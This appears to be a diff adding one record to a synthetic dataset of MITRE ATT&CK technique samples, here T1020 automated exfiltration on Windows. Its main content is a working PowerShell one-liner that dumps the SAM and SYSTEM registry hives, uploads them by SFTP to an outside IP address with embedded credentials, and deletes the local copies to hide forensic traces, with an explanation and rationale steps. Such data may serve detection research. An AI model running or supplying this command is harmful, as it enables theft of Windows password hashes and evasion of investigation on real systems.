@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1020",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "reg.exe save HKLM\\SAM C:\\Windows\\Temp\\SAM.hiv /y >$null 2>&1; reg.exe save HKLM\\SYSTEM C:\\Windows\\Temp\\SYSTEM.hiv /y >$null 2>&1; $r=\"/secure/\"; & 'C:\\Program Files (x86)\\WinSCP\\WinSCP.com' /ini=nul /command 'option batch abort' 'option confirm off' 'open sftp://exfil:S3cr3t!@203.0.113.40/ -hostkey=\"ssh-ed25519 255 SHA256:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\"' (\"put -resume C:\\Windows\\Temp\\SAM.hiv C:\\Windows\\Temp\\SYSTEM.hiv `\"$r`\"\") 'exit' | Out-Null; if($LASTEXITCODE -eq 0){ Remove-Item C:\\Windows\\Temp\\SAM.hiv,C:\\Windows\\Temp\\SYSTEM.hiv -Force -ErrorAction SilentlyContinue } 2>$null",
+  "explanation": "Exports sensitive registry hives and exfiltrates them via SFTP, cleaning up local artifacts after a successful transfer.",
+  "rationale_steps": [
+    "Export target data to local temporary files",
+    "Open SFTP connection using WinSCP in batch mode",
+    "Upload files with resume capability",
+    "Remove local copies to reduce forensic artifacts"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1020-1f3f2541-0dd50134",
+  "source_prompt_hash": "1f3f2541",
+  "timestamp_utc": "2025-09-30T09:07:17.472275Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
